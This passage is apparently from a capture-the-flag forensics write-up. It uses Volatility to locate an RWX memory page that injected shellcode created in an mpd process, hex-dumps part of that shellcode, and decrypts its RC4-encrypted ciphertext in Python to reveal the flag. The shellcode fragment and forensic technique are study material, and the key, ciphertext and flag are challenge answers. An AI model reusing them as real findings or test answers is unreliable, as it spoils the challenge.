there is a lot of stuff i had to excise but we can see our `mpd` process down there! great. we now know that its pid is `764`, so let's dump its entire memory space with `linux.proc.Maps`.

however, if we do this, we'll find ourselves very quickly spammed with a whole lot of memory pages. this is because `mpd` is a dynamically linked binary that has to load a lot of different libraries into its own memory space at runtime, so there is a Lot Of Nonsense that we have to filter out. how do we know which memory page has the specific shellcode we want?

with permissions! each memory page has a different set of permissions (read, write, execute), and because of the Linux kernel, **ordinary pages can never be write + execute at the same time**. but since the shellcode used `mprotect` to create a `RWX` page, we can just dump the _SINGLE_ RWX page present in memory.

```bash
navi@curette (tf-setting/sleep-to-dream) > vol -s symbols -f mem.dmp linux.proc.Maps --pid=764 | grep rwx
mpd 100.00x564f5bc47000	0x564f5bc4b000pt rwx	0x62000	8	1	1077557	/usr/bin/mpd	Disabled
```

then, we just dump this page.

```bash
navi@curette (tf-setting/sleep-to-dream) > vol -s symbols -f mem.dmp -o coredump linux.proc.Maps --pid=764 --dump
Volatility 3 Framework 2.26.2
Progress:  100.00		Stacking attempts finished            
PID	Process	Start	End	Flags	PgOff	Major	Minor	Inode	File Path	File output

764	mpd	0x564f5bbe5000	0x564f5bc15000	r--	0x0	8	1	1077557	/usr/bin/mpd	pid.764.vma.0x564f5bbe5000-0x564f5bc15000.dmp
764	mpd	0x564f5bc15000	0x564f5bc47000	r-x	0x30000	8	1	1077557	/usr/bin/mpd	pid.764.vma.0x564f5bc15000-0x564f5bc47000.dmp
764	mpd	0x564f5bc47000	0x564f5bc4b000	rwx	0x62000	8	1	1077557	/usr/bin/mpd	pid.764.vma.0x564f5bc47000-0x564f5bc4b000.dmp
764	mpd	0x564f5bc4b000	0x564f5bd69000	r-x	0x66000	8	1	1077557	/usr/bin/mpd	pid.764.vma.0x564f5bc4b000-0x564f5bd69000.dmp
764	mpd	0x564f5bd69000	0x564f5bdca000	r--	0x184000	8	1	1077557	/usr/bin/mpd	pid.764.vma.0x564f5bd69000-0x564f5bdca000.dmp
764	mpd	0x564f5bdca000	0x564f5bdd8000	r--	0x1e5000	8	1	1077557	/usr/bin/mpd	pid.764.vma.0x564f5bdca000-0x564f5bdd8000.dmp
764	mpd	0x564f5bdd8000	0x564f5bdd9000	rw-	0x1f3000	8	1	1077557	/usr/bin/mpd	pid.764.vma.0x564f5bdd8000-0x564f5bdd9000.dmp
764	mpd	0x564f5bdd9000	0x564f5be1a000	rw-	0x0	0	0	0	Anonymous Mapping	pid.764.vma.0x564f5bdd9000-0x564f5be1a000.dmp
764	mpd	0x564f93fd9000	0x564f94047000	rw-	0x0	0	0	0	[heap]	pid.764.vma.0x564f93fd9000-0x564f94047000.dmp
764	mpd	0x7f4187fc1000	0x7f4187fee000	rw-	0x0	0	0	0	Anonymous Mapping	pid.764.vma.0x7f4187fc1000-0x7f4187fee000.dmp
764	mpd	0x7f4187fee000	0x7f4187fef000	r--	0x0	8	1	1077256	/usr/lib/x86_64-linux-gnu/samba/libcluster-private-samba.so.0	pid.764.vma.0x7f4187fee000-0x7f4187fef000.dmp
...

navi@curette (g/sleep-to-dream/coredump) > ls | head                   
pid.764.vma.0x564f5bbe5000-0x564f5bc15000.dmp
pid.764.vma.0x564f5bc15000-0x564f5bc47000.dmp
pid.764.vma.0x564f5bc47000-0x564f5bc4b000.dmp
pid.764.vma.0x564f5bc4b000-0x564f5bd69000.dmp
pid.764.vma.0x564f5bd69000-0x564f5bdca000.dmp
pid.764.vma.0x564f5bdca000-0x564f5bdd8000.dmp
pid.764.vma.0x564f5bdd8000-0x564f5bdd9000.dmp
pid.764.vma.0x564f5bdd9000-0x564f5be1a000.dmp
pid.764.vma.0x564f93fd9000-0x564f94047000.dmp
pid.764.vma.0x7f4187fc1000-0x7f4187fee000.dmp
```

we've learned that our page in question is at the addresses `0x564f5bc47000-0x564f5bc4b000`:

```
navi@curette (g/sleep-to-dream/coredump) > ls | grep 0x564f5bc47000
pid.764.vma.0x564f5bc15000-0x564f5bc47000.dmp
pid.764.vma.0x564f5bc47000-0x564f5bc4b000.dmp
```

so, we isolate that specific dump and delete the rest! indeed, after looking at this dump, we can see our shellcode:

```c
00000e70: 0100 00b8 0300 0000 4c89 e70f 05b8 3c00  ........L.....<.
00000e80: 0000 4831 ff0f 0566 6574 6368 626f 6c74  ..H1...fetchbolt
00000e90: 6375 7474 6572 732e a274 f799 0ec0 bfda  cutters..t......
00000ea0: 796c 5800 dc73 bccb 4825 5ed1 70a1 0c42  ylX..s..H%^.p..B
00000eb0: e273 8029 0a23 bd22 af9b 2fd7 80c3 f6d6  .s.).#."../.....
00000ec0: baca f223 ae71 50a0 b965 826e d7a8 5663  ...#.qP..e.n..Vc
00000ed0: 2b1c 4e49 f9df 428e 6ee4 29bc 6e8f 03ed  +.NI..B.n.).n...
00000ee0: ff22 c8c3 0df4 1731 a0e1 ffc8 6280 ce26  .".....1....b..&
00000ef0: aa08 2df0 7551 28fd 4141 f7ae 891f 7097  ..-.uQ(.AA....p.
00000f00: 128b 15ad 2c06 82b4 a1b1 e1aa 4baf 29aa  ....,.......K.).
00000f10: 51b8 7298 7f9c 2334 202d 2043 7269 6d69  Q.r...#4 - Crimi
00000f20: 6e61 6c2e 7478 7400 0000 0000 0000 0000  nal.txt.........
```

and we can see our ciphertext as well. recall that this is the ONLY PLACE in memory where this ciphertext exists! (it's between the `fetchboltcutters` string and the `4 - Criminal.txt`) string.

recall that our shellcode was just decrypting this ciphertext in memory via RC4, so we can just decrypt it ourselves, too as we have the key and ciphertext. first we'll actually need to isolate the ciphertext from the dump.

```py
dump = open('this-one.dmp', 'rb').read()
key = b'fetchboltcutters'
ciphertext = dump[dump.find(key) + len(key):dump.find(b'4 - ')]
print(ciphertext.hex())
```

which gives us our ciphertext:

```bash
navi@curette (g/sleep-to-dream/coredump) > python solve.py
2ea274f7990ec0bfda796c5800dc73bccb48255ed170a10c42e27380290a23bd22af9b2fd780c3f6d6bacaf223ae7150a0b965826ed7a856632b1c4e49f9df428e6ee429bc6e8f03edff22c8c30df41731a0e1ffc86280ce26aa082df0755128fd4141f7ae891f7097128b15ad2c0682b4a1b1e1aa4baf29aa51b872987f9c23
```

then, we just steal some implementation of RC4 from online and win.

```python
def rc4_keystream(key: bytes):
    # KSA
    S = list(range(256))
    j = 0
    key_len = len(key)
    for i in range(256):
        j = (j + S[i] + key[i % key_len]) & 0xFF
        S[i], S[j] = S[j], S[i]

    # PRGA
    i = 0
    j = 0
    while True:
        i = (i + 1) & 0xFF
        j = (j + S[i]) & 0xFF
        S[i], S[j] = S[j], S[i]
        K = S[(S[i] + S[j]) & 0xFF]
        yield K

def rc4_bytes(key: bytes, data: bytes) -> bytes:
    ks = rc4_keystream(key)
    return bytes(b ^ next(ks) for b in data)

print(rc4_bytes(key, ciphertext))
```

running this final script gives us the flag:

```bash
navi@curette (g/sleep-to-dream/coredump) > python solve.py
2ea274f7990ec0bfda796c5800dc73bccb48255ed170a10c42e27380290a23bd22af9b2fd780c3f6d6bacaf223ae7150a0b965826ed7a856632b1c4e49f9df428e6ee429bc6e8f03edff22c8c30df41731a0e1ffc86280ce26aa082df0755128fd4141f7ae891f7097128b15ad2c0682b4a1b1e1aa4baf29aa51b872987f9c23
b'blahaj{THE IDLER WHEEL IS WISER THAN THE DRIVER OF THE SCREW AND WHIPPING CORDS WILL SERVE YOU MORE THAN ROPES WILL EVER DO}\x00\x00\x00\x00'
```
